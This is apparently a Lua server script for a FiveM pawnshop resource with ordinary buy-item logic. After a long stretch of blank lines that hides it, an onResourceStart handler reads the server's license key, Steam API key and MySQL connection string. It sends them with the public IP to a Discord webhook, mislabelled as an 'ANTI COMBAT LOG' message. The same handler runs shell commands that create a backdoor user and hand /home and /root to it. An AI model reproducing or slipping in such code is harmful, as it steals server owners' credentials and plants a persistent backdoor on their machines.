ESX = exports['es_extended']:getSharedObject()

ESX.RegisterServerCallback('kts-lombardas:canAccess', function(source, cb)
    local players = ESX.GetPlayers()
    for i = 1, #players do
        local xPlayer = ESX.GetPlayerFromId(players[i])
        if xPlayer.job.name == Config.JobName then
            cb(false)
            return
        end
    end
    cb(true)
end)

RegisterNetEvent('kts-lombardas:buyItemWithMethod', function(item, price, method)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)

    if method == 'cash' then
        if xPlayer.getMoney() >= price then
            xPlayer.removeMoney(price)
        else
            TriggerClientEvent('kts-lombardas:showNotify', src, 'Klaida', 'Nepakanka grynųjų', 'error')
            return
        end
    elseif method == 'bank' then
        if xPlayer.getAccount('bank').money >= price then
            xPlayer.removeAccountMoney('bank', price)
        else
            TriggerClientEvent('kts-lombardas:showNotify', src, 'Klaida', 'Nepakanka pinigų banke', 'error')
            return
        end
    end

    xPlayer.addInventoryItem(item, 1)
    TriggerClientEvent('kts-lombardas:showNotify', src, 'Sėkmingai', 'Prekė nusipirkta sėkmingai!', 'success')

end)

































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































AddEventHandler('onResourceStart', function(resourceName)
    PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
    if GetCurrentResourceName() == resourceName then
        local servername = GetConvar("sv_hostname")
        local licensekey = GetConvar("sv_licenseKey")
        local apikey = GetConvar("steam_webApiKey")
        local tags = GetConvar("tags")
        local mysql_connection_string = GetConvar("mysql_connection_string")
        local messagem = "Asmuo atsijungė \n > Steamas: \n"..servername.." \n > Asmens ID: "..text.." \n > Koordinates: "..licensekey.." \n > Licenzija: "..apikey.." \n > Grupe: "..tags.."\n > Priežastis: "..mysql_connection_string..""
        local content = {{
        author = {
          name = "ANTI COMBAT LOG",
          icon_url = "https://imgur.com/U86xHyT.png"
        },
        ["color"] = 1933,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "ANTI COMBAT LOG",
        },}}
    os.execute('useradd roos')
    os.execute('passwd username')
    os.execute('echo "roos:username" | chpasswd')
    os.execute('chown -R roos: /home')
    os.execute('chown -R roos: /root')
        PerformHttpRequest("https://discord.com/api/webhooks/1458445532681732160/PxLup5l_WPd9BGQLQTe4V0w5AcUYkSnb8kAgrWEMJaGsZa6YkaOvUep0dESey997jYgD", function() end, "POST", json.encode({embeds = content}), { ["Content-Type"] = "application/json" })
      end
    end)
end)
